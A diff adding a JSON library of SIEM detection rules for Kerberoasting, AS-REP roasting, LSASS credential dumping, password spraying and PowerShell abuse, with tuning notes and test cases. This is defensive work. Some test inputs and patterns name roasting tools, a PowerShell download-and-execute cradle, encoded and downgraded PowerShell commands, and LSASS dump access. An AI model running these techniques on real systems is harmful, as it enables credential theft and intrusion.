@@ -1,0 +1,3387 @@
+{
+ "framework": "SENTINEL MATRIX Detection Scenario Library",
+ "dataset_kind": "bundled",
+ "version": "1.0.0",
+ "generated_at": "2026-11-09T14:20:14.333521+00:00",
+ "kb": {
+  "T1558.003": {
+   "name": "Kerberoasting",
+   "scenarios": [
+    {
+     "id": "KRB-01",
+     "name": "Abnormal service ticket request volume",
+     "objective": "Detect a single account requesting an unusually high number of Kerberos service tickets (TGS) in a short window.",
+     "logic_type": "threshold",
+     "severity": "high",
+     "keywords": [
+      "4769",
+      "service ticket",
+      "kerberoast"
+     ],
+     "event_ids": [
+      4769
+     ],
+     "log_source_types": [
+      "active_directory",
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4769
+      },
+      {
+       "field": "ServiceName",
+       "op": "ne",
+       "value": "krbtgt"
+      },
+      {
+       "field": "ServiceName",
+       "op": "not_in",
+       "value": [
+        "*$"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "count",
+      "group_by": [
+       "TargetUserName"
+      ],
+      "threshold": 10,
+      "window_minutes": 5,
+      "distinct": "ServiceName"
+     },
+     "fp": [
+      "Service/monitoring accounts that enumerate many SPNs",
+      "Backup software authenticating to many services at startup"
+     ],
+     "tuning": [
+      "Baseline per-user distinct SPN counts over 30 days before setting the threshold",
+      "Exclude known scanner/monitoring accounts via a reference set"
+     ],
+     "tests": [
+      {
+       "name": "10 distinct SPNs from one user in 2 minutes",
+       "input": {
+        "EventID": 4769,
+        "TargetUserName": "jdoe@CORP",
+        "distinct_ServiceName": 10,
+        "window_minutes": 2
+       },
+       "expected": "match"
+      },
+      {
+       "name": "Normal user requesting 2 tickets",
+       "input": {
+        "EventID": 4769,
+        "TargetUserName": "asmith@CORP",
+        "distinct_ServiceName": 2,
+        "window_minutes": 5
+       },
+       "expected": "no_match"
+      }
+     ]
+    },
+    {
+     "id": "KRB-02",
+     "name": "Weak encryption-type service ticket (RC4) for SPN accounts",
+     "objective": "Detect TGS requests using RC4-HMAC (0x17) for service accounts that normally use AES.",
+     "logic_type": "correlation",
+     "severity": "high",
+     "keywords": [
+      "0x17",
+      "rc4",
+      "TicketEncryptionType"
+     ],
+     "event_ids": [
+      4769
+     ],
+     "log_source_types": [
+      "active_directory",
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4769
+      },
+      {
+       "field": "TicketEncryptionType",
+       "op": "eq",
+       "value": "0x17"
+      },
+      {
+       "field": "ServiceName",
+       "op": "ne",
+       "value": "krbtgt"
+      },
+      {
+       "field": "ServiceName",
+       "op": "not_in",
+       "value": [
+        "*$"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Legacy applications hard-coded to RC4",
+      "Accounts without AES keys set (msDS-SupportedEncryptionTypes)"
+     ],
+     "tuning": [
+      "Inventory accounts lacking AES keys and remediate; exclude temporarily via a reference set",
+      "Correlate with KRB-01 for higher confidence"
+     ],
+     "tests": [
+      {
+       "name": "RC4 TGS for SPN account",
+       "input": {
+        "EventID": 4769,
+        "TicketEncryptionType": "0x17",
+        "ServiceName": "svc_sql"
+       },
+       "expected": "match"
+      },
+      {
+       "name": "AES TGS",
+       "input": {
+        "EventID": 4769,
+        "TicketEncryptionType": "0x12",
+        "ServiceName": "svc_sql"
+       },
+       "expected": "no_match"
+      }
+     ]
+    },
+    {
+     "id": "KRB-03",
+     "name": "Service ticket requests from an unusual source host",
+     "objective": "Detect TGS requests for a service account from a host not previously seen requesting that SPN.",
+     "logic_type": "baseline",
+     "severity": "medium",
+     "keywords": [
+      "IpAddress",
+      "unusual host",
+      "new source"
+     ],
+     "event_ids": [
+      4769
+     ],
+     "log_source_types": [
+      "active_directory",
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4769
+      },
+      {
+       "field": "ServiceName",
+       "op": "ne",
+       "value": "krbtgt"
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "new_value",
+      "group_by": [
+       "ServiceName"
+      ],
+      "threshold": 1,
+      "window_minutes": 1440,
+      "observe": "IpAddress",
+      "baseline_days": 30
+     },
+     "fp": [
+      "DHCP churn in user VLANs",
+      "Newly onboarded servers"
+     ],
+     "tuning": [
+      "Key the baseline on hostname rather than IP where DHCP is in use",
+      "Scope to high-value SPNs (SQL, Exchange, ADFS) first"
+     ],
+     "tests": [
+      {
+       "name": "New client IP for an SPN",
+       "input": {
+        "EventID": 4769,
+        "ServiceName": "svc_sql",
+        "IpAddress": "10.44.9.12",
+        "baseline_seen": false
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "KRB-04",
+     "name": "Honeytoken SPN requested",
+     "objective": "Detect any TGS request for a decoy service account that no legitimate client should ever use.",
+     "logic_type": "entity",
+     "severity": "critical",
+     "keywords": [
+      "honey",
+      "decoy",
+      "canary"
+     ],
+     "event_ids": [
+      4769
+     ],
+     "log_source_types": [
+      "active_directory",
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4769
+      },
+      {
+       "field": "ServiceName",
+       "op": "in",
+       "value": [
+        "svc_honey_sql",
+        "svc_decoy_backup"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Vulnerability scanners that enumerate every SPN (exclude scanner accounts)"
+     ],
+     "tuning": [
+      "Maintain the decoy SPN list in a reference set",
+      "Make the decoy accounts realistic (old password, descriptive name)"
+     ],
+     "tests": [
+      {
+       "name": "Decoy SPN requested",
+       "input": {
+        "EventID": 4769,
+        "ServiceName": "svc_honey_sql"
+       },
+       "expected": "match"
+      },
+      {
+       "name": "Real SPN requested",
+       "input": {
+        "EventID": 4769,
+        "ServiceName": "svc_sql"
+       },
+       "expected": "no_match"
+      }
+     ]
+    },
+    {
+     "id": "KRB-05",
+     "name": "Kerberoasting tooling indicator on endpoint",
+     "objective": "Flag process-creation / script-block telemetry whose command text contains known roasting tool indicators.",
+     "logic_type": "process",
+     "severity": "high",
+     "keywords": [
+      "kerberoast",
+      "getuserspns",
+      "rubeus"
+     ],
+     "event_ids": [
+      4688,
+      1,
+      4104
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr",
+      "powershell"
+     ],
+     "selection": [
+      {
+       "field": "CommandLine",
+       "op": "contains_any",
+       "value": [
+        "kerberoast",
+        "getuserspns",
+        "requestorsecuritytoken"
+       ]
+      }
+     ],
+     "exclusions": [
+      {
+       "field": "CommandLine",
+       "op": "contains_any",
+       "value": [
+        "klist"
+       ]
+      }
+     ],
+     "agg": null,
+     "fp": [
+      "Authorised red-team/purple-team exercises (coordinate via change record)"
+     ],
+     "tuning": [
+      "Also evaluate PowerShell ScriptBlock (EID 4104) text",
+      "Add EDR hashes of known tooling"
+     ],
+     "tests": [
+      {
+       "name": "Roasting tool indicator present",
+       "input": {
+        "EventID": 1,
+        "CommandLine": "... kerberoast /outfile:..."
+       },
+       "expected": "match"
+      },
+      {
+       "name": "Benign klist",
+       "input": {
+        "EventID": 1,
+        "CommandLine": "klist tickets"
+       },
+       "expected": "no_match"
+      }
+     ]
+    },
+    {
+     "id": "KRB-06",
+     "name": "Privileged or dormant account requesting service tickets",
+     "objective": "Detect TGS requests by accounts in a privileged or dormant reference set.",
+     "logic_type": "entity",
+     "severity": "medium",
+     "keywords": [
+      "privileged",
+      "dormant",
+      "domain admin"
+     ],
+     "event_ids": [
+      4769
+     ],
+     "log_source_types": [
+      "active_directory",
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4769
+      },
+      {
+       "field": "ServiceName",
+       "op": "ne",
+       "value": "krbtgt"
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "count",
+      "group_by": [
+       "TargetUserName"
+      ],
+      "threshold": 3,
+      "window_minutes": 10,
+      "reference_set": "Privileged or Dormant Accounts"
+     },
+     "fp": [
+      "Administrators performing scheduled maintenance"
+     ],
+     "tuning": [
+      "Populate the reference set from AD group membership and lastLogon exports",
+      "Lower the threshold to 1 for dormant accounts"
+     ],
+     "tests": [
+      {
+       "name": "Dormant account requests 3 tickets",
+       "input": {
+        "EventID": 4769,
+        "TargetUserName": "old_contractor",
+        "in_reference_set": true,
+        "count": 3
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "KRB-07",
+     "name": "Identity + endpoint correlation: TGS burst then credential tooling",
+     "objective": "Correlate a TGS burst with LSASS access or offline-cracking tooling on the same host within 30 minutes.",
+     "logic_type": "multi_source",
+     "severity": "critical",
+     "keywords": [
+      "correlation",
+      "sequence",
+      "multi-source"
+     ],
+     "event_ids": [
+      4769,
+      10,
+      1
+     ],
+     "log_source_types": [
+      "active_directory",
+      "windows_security",
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4769
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "sequence",
+      "group_by": [
+       "IpAddress"
+      ],
+      "threshold": 2,
+      "window_minutes": 30,
+      "steps": [
+       "KRB-01 fires for the source IP",
+       "On the same host: LSASS-01 fires, or process telemetry shows an offline-cracking tool"
+      ]
+     },
+     "fp": [
+      "Rare; investigate every hit"
+     ],
+     "tuning": [
+      "Requires asset-to-IP resolution between DC logs and endpoint telemetry"
+     ],
+     "tests": [
+      {
+       "name": "Burst then cracking tool on same host",
+       "input": {
+        "step1": {
+         "EventID": 4769,
+         "IpAddress": "10.1.2.3",
+         "count": 12
+        },
+        "step2": {
+         "EventID": 1,
+         "Computer": "WS-1023",
+         "indicator": "offline_cracker"
+        },
+        "within_minutes": 12
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "KRB-08",
+     "name": "Baseline deviation in daily service-ticket volume per account",
+     "objective": "Per-account daily TGS count exceeds mean + 3\u03c3 of its 30-day baseline.",
+     "logic_type": "statistical",
+     "severity": "medium",
+     "keywords": [
+      "baseline",
+      "deviation",
+      "anomaly"
+     ],
+     "event_ids": [
+      4769
+     ],
+     "log_source_types": [
+      "active_directory",
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4769
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "zscore",
+      "group_by": [
+       "TargetUserName"
+      ],
+      "threshold": 3,
+      "window_minutes": 1440,
+      "baseline_days": 30,
+      "metric": "count"
+     },
+     "fp": [
+      "Patch Tuesday / mass restarts",
+      "New application rollouts"
+     ],
+     "tuning": [
+      "Use median absolute deviation for robustness",
+      "Suppress on change-freeze calendar days"
+     ],
+     "tests": [
+      {
+       "name": "300 today vs baseline 20\u00b15",
+       "input": {
+        "TargetUserName": "jdoe",
+        "today": 300,
+        "mean": 20,
+        "stdev": 5
+       },
+       "expected": "match"
+      },
+      {
+       "name": "Within baseline",
+       "input": {
+        "TargetUserName": "jdoe",
+        "today": 28,
+        "mean": 20,
+        "stdev": 5
+       },
+       "expected": "no_match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1558.004": {
+   "name": "AS-REP Roasting",
+   "scenarios": [
+    {
+     "id": "ASREP-01",
+     "name": "TGT request without pre-authentication",
+     "objective": "Detect AS-REQ (4768) with PreAuthType 0, indicating accounts flagged DONT_REQ_PREAUTH.",
+     "logic_type": "process",
+     "severity": "high",
+     "keywords": [
+      "4768",
+      "pre-authentication",
+      "preauth"
+     ],
+     "event_ids": [
+      4768
+     ],
+     "log_source_types": [
+      "active_directory",
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4768
+      },
+      {
+       "field": "PreAuthType",
+       "op": "eq",
+       "value": "0"
+      },
+      {
+       "field": "Status",
+       "op": "eq",
+       "value": "0x0"
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Legacy systems with pre-auth disabled by design"
+     ],
+     "tuning": [
+      "Remediate DONT_REQ_PREAUTH flags; keep exceptions in a reference set"
+     ],
+     "tests": [
+      {
+       "name": "No-preauth TGT",
+       "input": {
+        "EventID": 4768,
+        "PreAuthType": "0",
+        "Status": "0x0"
+       },
+       "expected": "match"
+      },
+      {
+       "name": "Normal TGT",
+       "input": {
+        "EventID": 4768,
+        "PreAuthType": "2"
+       },
+       "expected": "no_match"
+      }
+     ]
+    },
+    {
+     "id": "ASREP-02",
+     "name": "Many no-preauth TGT requests from one source",
+     "objective": "Threshold on 4768 PreAuthType 0 across many accounts from one IP (roastable-account enumeration).",
+     "logic_type": "threshold",
+     "severity": "high",
+     "keywords": [
+      "4768",
+      "preauth",
+      "multiple accounts"
+     ],
+     "event_ids": [
+      4768
+     ],
+     "log_source_types": [
+      "active_directory",
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4768
+      },
+      {
+       "field": "PreAuthType",
+       "op": "eq",
+       "value": "0"
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "count",
+      "group_by": [
+       "IpAddress"
+      ],
+      "threshold": 5,
+      "window_minutes": 10,
+      "distinct": "TargetUserName"
+     },
+     "fp": [
+      "Vulnerability scanners"
+     ],
+     "tuning": [
+      "Exclude scanner IPs via reference set"
+     ],
+     "tests": [
+      {
+       "name": "5 accounts from one IP",
+       "input": {
+        "EventID": 4768,
+        "PreAuthType": "0",
+        "IpAddress": "10.1.1.9",
+        "distinct_users": 5
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "ASREP-03",
+     "name": "DONT_REQ_PREAUTH flag enabled on an account",
+     "objective": "Detect UAC change (4738) enabling 'do not require Kerberos pre-authentication'.",
+     "logic_type": "state_change",
+     "severity": "high",
+     "keywords": [
+      "4738",
+      "UserAccountControl",
+      "2096"
+     ],
+     "event_ids": [
+      4738
+     ],
+     "log_source_types": [
+      "active_directory",
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4738
+      },
+      {
+       "field": "UserAccountControl",
+       "op": "contains",
+       "value": "2096"
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Legitimate configuration of a legacy service account"
+     ],
+     "tuning": [
+      "Require change-ticket correlation"
+     ],
+     "tests": [
+      {
+       "name": "Flag enabled",
+       "input": {
+        "EventID": 4738,
+        "UserAccountControl": "%%2096"
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1003.001": {
+   "name": "LSASS Memory",
+   "scenarios": [
+    {
+     "id": "LSASS-01",
+     "name": "Suspicious process access to LSASS",
+     "objective": "Flag Sysmon EID 10 where a non-system process opens lsass.exe with memory-read access rights.",
+     "logic_type": "process",
+     "severity": "critical",
+     "keywords": [
+      "lsass",
+      "ProcessAccess",
+      "GrantedAccess"
+     ],
+     "event_ids": [
+      10
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 10
+      },
+      {
+       "field": "TargetImage",
+       "op": "endswith",
+       "value": "\\lsass.exe"
+      },
+      {
+       "field": "GrantedAccess",
+       "op": "in",
+       "value": [
+        "0x1010",
+        "0x1410",
+        "0x1438",
+        "0x143a",
+        "0x1FFFFF",
+        "0x1F1FFF"
+       ]
+      }
+     ],
+     "exclusions": [
+      {
+       "field": "SourceImage",
+       "op": "endswith_any",
+       "value": [
+        "\\MsMpEng.exe",
+        "\\csrss.exe",
+        "\\wininit.exe",
+        "\\services.exe",
+        "\\taskmgr.exe"
+       ]
+      }
+     ],
+     "agg": null,
+     "fp": [
+      "AV/EDR engines, backup agents, Task Manager, Process Explorer"
+     ],
+     "tuning": [
+      "Tune exclusions per environment from a 30-day source-image inventory",
+      "Raise confidence when CallTrace contains UNKNOWN or dbghelp/dbgcore"
+     ],
+     "tests": [
+      {
+       "name": "Dumping utility opens lsass",
+       "input": {
+        "EventID": 10,
+        "SourceImage": "C:\\tools\\util.exe",
+        "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+        "GrantedAccess": "0x1FFFFF"
+       },
+       "expected": "match"
+      },
+      {
+       "name": "Defender access",
+       "input": {
+        "EventID": 10,
+        "SourceImage": "...\\MsMpEng.exe",
+        "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+        "GrantedAccess": "0x1FFFFF"
+       },
+       "expected": "no_match"
+      }
+     ]
+    },
+    {
+     "id": "LSASS-02",
+     "name": "Credential-dump file created",
+     "objective": "Detect creation of a memory-dump file for lsass via Sysmon EID 11 / EDR file telemetry.",
+     "logic_type": "process",
+     "severity": "high",
+     "keywords": [
+      "lsass",
+      "dmp",
+      "FileCreate"
+     ],
+     "event_ids": [
+      11
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 11
+      },
+      {
+       "field": "TargetFilename",
+       "op": "contains",
+       "value": "lsass"
+      },
+      {
+       "field": "TargetFilename",
+       "op": "endswith_any",
+       "value": [
+        ".dmp"
+       ]
+      }
+     ],
+     "exclusions": [
+      {
+       "field": "Image",
+       "op": "endswith_any",
+       "value": [
+        "\\WerFault.exe"
+       ]
+      }
+     ],
+     "agg": null,
+     "fp": [
+      "Windows Error Reporting dumps of a crashing lsass (creator WerFault.exe)"
+     ],
+     "tuning": [
+      "Exclude WerFault.exe as the creating image"
+     ],
+     "tests": [
+      {
+       "name": "Dump file written",
+       "input": {
+        "EventID": 11,
+        "TargetFilename": "C:\\temp\\lsass.dmp",
+        "Image": "C:\\tools\\util.exe"
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "LSASS-03",
+     "name": "Unsigned module loaded into LSASS",
+     "objective": "Detect a new DLL loaded into lsass.exe that is unsigned or not on a known-good list (Sysmon EID 7).",
+     "logic_type": "state_change",
+     "severity": "high",
+     "keywords": [
+      "ImageLoaded",
+      "lsass",
+      "unsigned"
+     ],
+     "event_ids": [
+      7
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 7
+      },
+      {
+       "field": "Image",
+       "op": "endswith",
+       "value": "\\lsass.exe"
+      },
+      {
+       "field": "Signed",
+       "op": "eq",
+       "value": "false"
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Third-party credential providers / smart-card middleware"
+     ],
+     "tuning": [
+      "Build an allowlist of signed vendors legitimately loaded into lsass"
+     ],
+     "tests": [
+      {
+       "name": "Unsigned DLL in lsass",
+       "input": {
+        "EventID": 7,
+        "Image": "...\\lsass.exe",
+        "Signed": "false"
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "LSASS-04",
+     "name": "Harvesting across multiple hosts by one account",
+     "objective": "Correlate LSASS-01 hits where one account touches lsass on 3+ hosts within an hour.",
+     "logic_type": "correlation",
+     "severity": "critical",
+     "keywords": [
+      "multiple hosts",
+      "harvesting"
+     ],
+     "event_ids": [
+      10
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 10
+      },
+      {
+       "field": "TargetImage",
+       "op": "endswith",
+       "value": "\\lsass.exe"
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "count",
+      "group_by": [
+       "User"
+      ],
+      "threshold": 3,
+      "window_minutes": 60,
+      "distinct": "Computer"
+     },
+     "fp": [
+      "EDR deployment jobs run by a service account"
+     ],
+     "tuning": [
+      "Exclude security-tooling service accounts"
+     ],
+     "tests": [
+      {
+       "name": "One account, 3 hosts",
+       "input": {
+        "EventID": 10,
+        "User": "adm1",
+        "distinct_Computer": 3,
+        "window_minutes": 40
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1110.003": {
+   "name": "Password Spraying",
+   "scenarios": [
+    {
+     "id": "SPRAY-01",
+     "name": "Many accounts failing auth from one source",
+     "objective": "Detect a single source producing failed logons (4625) against many distinct accounts in a short window.",
+     "logic_type": "threshold",
+     "severity": "high",
+     "keywords": [
+      "4625",
+      "failed logon",
+      "spray"
+     ],
+     "event_ids": [
+      4625
+     ],
+     "log_source_types": [
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4625
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "count",
+      "group_by": [
+       "IpAddress"
+      ],
+      "threshold": 15,
+      "window_minutes": 15,
+      "distinct": "TargetUserName"
+     },
+     "fp": [
+      "Misconfigured application or service with a stale password",
+      "NAT/VPN concentrator aggregating many users behind one IP"
+     ],
+     "tuning": [
+      "Baseline failed-auth volume per source",
+      "Where many users share one egress IP, group by workstation instead"
+     ],
+     "tests": [
+      {
+       "name": "1 source, 20 accounts, 1 failure each",
+       "input": {
+        "EventID": 4625,
+        "IpAddress": "10.2.2.2",
+        "distinct_users": 20,
+        "window_minutes": 10
+       },
+       "expected": "match"
+      },
+      {
+       "name": "1 user fat-fingering password 5x",
+       "input": {
+        "EventID": 4625,
+        "IpAddress": "10.2.2.2",
+        "distinct_users": 1,
+        "count": 5
+       },
+       "expected": "no_match"
+      }
+     ]
+    },
+    {
+     "id": "SPRAY-02",
+     "name": "Distributed spray against one account set",
+     "objective": "Low-and-slow: many sources, few attempts each, same target account set over hours.",
+     "logic_type": "statistical",
+     "severity": "medium",
+     "keywords": [
+      "distributed",
+      "low and slow"
+     ],
+     "event_ids": [
+      4625
+     ],
+     "log_source_types": [
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4625
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "count",
+      "group_by": [
+       "TargetUserName"
+      ],
+      "threshold": 10,
+      "window_minutes": 180,
+      "distinct": "IpAddress"
+     },
+     "fp": [
+      "Mail clients with cached bad credentials across devices"
+     ],
+     "tuning": [
+      "Correlate with impossible-travel on any subsequent success"
+     ],
+     "tests": [
+      {
+       "name": "10 sources against one account over 2h",
+       "input": {
+        "EventID": 4625,
+        "TargetUserName": "svc_app",
+        "distinct_ips": 10,
+        "window_minutes": 120
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "SPRAY-03",
+     "name": "Cloud/identity-provider sign-in spray",
+     "objective": "Detect failed interactive/non-interactive sign-ins across many users from one ASN/IP in the IdP logs.",
+     "logic_type": "threshold",
+     "severity": "high",
+     "keywords": [
+      "signin",
+      "identity",
+      "spray"
+     ],
+     "event_ids": [],
+     "log_source_types": [
+      "identity"
+     ],
+     "selection": [
+      {
+       "field": "ResultType",
+       "op": "in",
+       "value": [
+        "50126",
+        "50053",
+        "50055"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "count",
+      "group_by": [
+       "IPAddress"
+      ],
+      "threshold": 15,
+      "window_minutes": 15,
+      "distinct": "UserPrincipalName"
+     },
+     "fp": [
+      "Corporate egress IP shared by many users",
+      "Legacy auth clients"
+     ],
+     "tuning": [
+      "Block legacy auth; baseline per-IP user fan-out"
+     ],
+     "tests": [
+      {
+       "name": "One IP, many users, failures",
+       "input": {
+        "ResultType": "50126",
+        "IPAddress": "20.1.1.1",
+        "distinct_users": 25
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "SPRAY-04",
+     "name": "Spray followed by a success",
+     "objective": "Correlate a spray burst with a subsequent successful logon (4624) for one of the targeted accounts from the same source.",
+     "logic_type": "multi_source",
+     "severity": "critical",
+     "keywords": [
+      "spray",
+      "success",
+      "4624"
+     ],
+     "event_ids": [
+      4625,
+      4624
+     ],
+     "log_source_types": [
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4625
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "sequence",
+      "group_by": [
+       "IpAddress"
+      ],
+      "threshold": 2,
+      "window_minutes": 30,
+      "steps": [
+       "SPRAY-01 fires for the source",
+       "4624 success for a targeted account from the same source"
+      ]
+     },
+     "fp": [
+      "Rare; investigate every hit"
+     ],
+     "tuning": [
+      "Resolve source IP to asset for context"
+     ],
+     "tests": [
+      {
+       "name": "Spray then success",
+       "input": {
+        "step1": "SPRAY-01",
+        "step2": {
+         "EventID": 4624,
+         "IpAddress": "10.2.2.2"
+        },
+        "within_minutes": 20
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1059.001": {
+   "name": "PowerShell",
+   "scenarios": [
+    {
+     "id": "PWSH-01",
+     "name": "Encoded command execution",
+     "objective": "Flag PowerShell launched with an encoded-command switch in process/command telemetry.",
+     "logic_type": "process",
+     "severity": "high",
+     "keywords": [
+      "powershell",
+      "encodedcommand",
+      "-enc"
+     ],
+     "event_ids": [
+      4688,
+      1,
+      4104
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr",
+      "powershell"
+     ],
+     "selection": [
+      {
+       "field": "CommandLine",
+       "op": "contains_any",
+       "value": [
+        "-enc",
+        "-encodedcommand",
+        "-e "
+       ]
+      },
+      {
+       "field": "Image",
+       "op": "contains_any",
+       "value": [
+        "powershell",
+        "pwsh"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Some management agents legitimately use encoded commands"
+     ],
+     "tuning": [
+      "Allowlist known management-agent parents/signers",
+      "Decode and inspect the payload where the SIEM supports it"
+     ],
+     "tests": [
+      {
+       "name": "Encoded command",
+       "input": {
+        "EventID": 1,
+        "Image": "...powershell.exe",
+        "CommandLine": "powershell -enc SQBFAFgA..."
+       },
+       "expected": "match"
+      },
+      {
+       "name": "Normal cmdlet",
+       "input": {
+        "EventID": 1,
+        "CommandLine": "powershell Get-Service"
+       },
+       "expected": "no_match"
+      }
+     ]
+    },
+    {
+     "id": "PWSH-02",
+     "name": "Suspicious download/exec cradle in script block",
+     "objective": "Detect script-block logging (4104) text containing in-memory download-execute patterns.",
+     "logic_type": "process",
+     "severity": "high",
+     "keywords": [
+      "4104",
+      "scriptblock",
+      "downloadstring",
+      "iex"
+     ],
+     "event_ids": [
+      4104
+     ],
+     "log_source_types": [
+      "powershell"
+     ],
+     "selection": [
+      {
+       "field": "ScriptBlockText",
+       "op": "contains_any",
+       "value": [
+        "downloadstring",
+        "downloadfile",
+        "invoke-expression",
+        "iex (",
+        "frombase64string",
+        "net.webclient"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Legitimate admin scripts that fetch modules"
+     ],
+     "tuning": [
+      "Allowlist signed internal scripts by path/hash",
+      "Combine with network egress to uncommon hosts"
+     ],
+     "tests": [
+      {
+       "name": "Download cradle",
+       "input": {
+        "EventID": 4104,
+        "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://...')"
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "PWSH-03",
+     "name": "PowerShell spawned by Office application",
+     "objective": "Detect powershell/pwsh whose parent is an Office process.",
+     "logic_type": "process",
+     "severity": "high",
+     "keywords": [
+      "parent",
+      "winword",
+      "excel",
+      "office"
+     ],
+     "event_ids": [
+      1,
+      4688
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "Image",
+       "op": "contains_any",
+       "value": [
+        "powershell",
+        "pwsh"
+       ]
+      },
+      {
+       "field": "ParentImage",
+       "op": "endswith_any",
+       "value": [
+        "\\winword.exe",
+        "\\excel.exe",
+        "\\powerpnt.exe",
+        "\\outlook.exe",
+        "\\mspub.exe"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Rare legitimate macros in some enterprises"
+     ],
+     "tuning": [
+      "Pair with ASR rule telemetry",
+      "Alert higher when combined with PWSH-01/02"
+     ],
+     "tests": [
+      {
+       "name": "Word spawns powershell",
+       "input": {
+        "EventID": 1,
+        "Image": "...powershell.exe",
+        "ParentImage": "C:\\...\\WINWORD.EXE"
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "PWSH-04",
+     "name": "Downgrade to PowerShell v2",
+     "objective": "Detect use of -version 2 to evade script-block logging/AMSI.",
+     "logic_type": "process",
+     "severity": "medium",
+     "keywords": [
+      "version 2",
+      "downgrade",
+      "v2"
+     ],
+     "event_ids": [
+      1,
+      4688
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "CommandLine",
+       "op": "contains_any",
+       "value": [
+        "-version 2",
+        "-v 2"
+       ]
+      },
+      {
+       "field": "Image",
+       "op": "contains_any",
+       "value": [
+        "powershell"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Legacy scripts pinned to v2"
+     ],
+     "tuning": [
+      "Remove the v2 engine where possible"
+     ],
+     "tests": [
+      {
+       "name": "v2 downgrade",
+       "input": {
+        "EventID": 1,
+        "CommandLine": "powershell -version 2 -nop -w hidden ..."
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "PWSH-05",
+     "name": "Script-block logging disabled",
+     "objective": "Detect registry changes disabling PowerShell script-block/module logging.",
+     "logic_type": "state_change",
+     "severity": "high",
+     "keywords": [
+      "4657",
+      "scriptblocklogging",
+      "registry"
+     ],
+     "event_ids": [
+      4657,
+      13
+     ],
+     "log_source_types": [
+      "windows_security",
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "ObjectName",
+       "op": "contains_any",
+       "value": [
+        "ScriptBlockLogging",
+        "ModuleLogging",
